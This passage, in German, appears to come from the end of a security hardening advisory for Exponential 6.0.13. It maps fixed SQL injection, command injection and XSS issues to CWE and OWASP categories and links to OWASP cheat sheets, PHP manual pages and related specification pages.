| SEC-03 Injection des Pfads in LIKE | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet |
| SEC-04 Injection von Knoten/Pfad | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet |
| SEC-05 RCE über Sendmail | CWE-78 | A03:2021 Injection | OS Command Injection Defense Cheat Sheet |
| SEC-06 Shell-Injection bei gzip | CWE-78 | A03:2021 Injection | OS Command Injection Defense Cheat Sheet |
| SEC-07 Reflektiertes XSS | CWE-79 | A03:2021 Injection | XSS Prevention Cheat Sheet |

**Weiterführende Literatur:**

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PHP-Handbuch — escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php)
- [PHP-Handbuch — htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php)
- [Injection über das fünfte Argument von mail() in PHP — siehe den PHP-Hinweis MOPB-56-2007](https://www.php.net/manual/en/function.mail.php#refsect1-function.mail-notes)
- [CWE-89 Improper Neutralisation of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78 Improper Neutralisation of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-79 Improper Neutralisation of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)


*Ende des Dokuments — Hinweise zur Sicherheitshärtung von Exponential 6.0.13*  
*Erstellt am 2026-02-21 | Kontakt: security@exponential.earth*

## Verwandte Seiten

- [Spezifikation: die Sicherheits- und Stabilitätshärtung von 6.0.13](../../spezifikationen/6.0/sicherheitshaertung-6.0.13.md)
- [Spezifikation: die Sicherheitskorrekturen vom August 2026](../../spezifikationen/6.0/sicherheitshaertung-2026-08.md)
- [Sicherheitsstandards vom September 2026](../../spezifikationen/6.0/sicherheitsvorgaben-2026-09.md)
- [Härtung von Datentypen und Eingaben (27. September 2026)](../../spezifikationen/6.0/datentyp-eingabehaertung.md)
- [RAD-Werkzeuge — Sicherheit](rad-sicherheit.md)
- [Februar 2026](../../geschichte/2026/2026-02.md)
